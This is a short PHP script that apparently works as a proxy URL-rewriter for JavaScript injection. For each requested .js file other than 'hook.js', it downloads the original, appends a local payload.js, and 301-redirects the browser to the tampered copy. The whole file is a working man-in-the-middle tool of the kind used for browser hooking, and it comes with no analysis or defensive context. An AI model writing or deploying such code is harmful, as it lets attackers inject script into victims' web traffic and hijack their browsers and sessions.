#!/usr/bin/env php
<?php
stream_set_timeout(STDIN, 86400);

while ( $stdin = fgets(STDIN) ) {
	$pecah = explode(' ', $stdin);
	$url = trim($pecah[0]);
	if( isJS( $url ) AND (stripos( $url, 'hook.js' ) === false)) {
		$file = dirname(__FILE__) . '/payload/' . md5( $url ) . '.js';
		if( !file_exists( $file ) ) {
			exec( "wget " . escapeshellarg( $url ) . " -O " . escapeshellarg( $file ));
			exec( "cat " . escapeshellarg( dirname(__FILE__) . "/payload.js" ) . " >> " . escapeshellarg( $file ));
		}
		$url = "301:http://localhost/payload/" . md5( $url ) . ".js";
	}
	printf("%s\n", $url);
}

function isJS($url) {
	$url = parse_url( $url );
	if( !isset( $url['path'] ) ) {
		return false;
	}
	return (bool) ( strtolower( end( explode('.', $url['path']) ) ) === 'js' ); // one-liner hack
}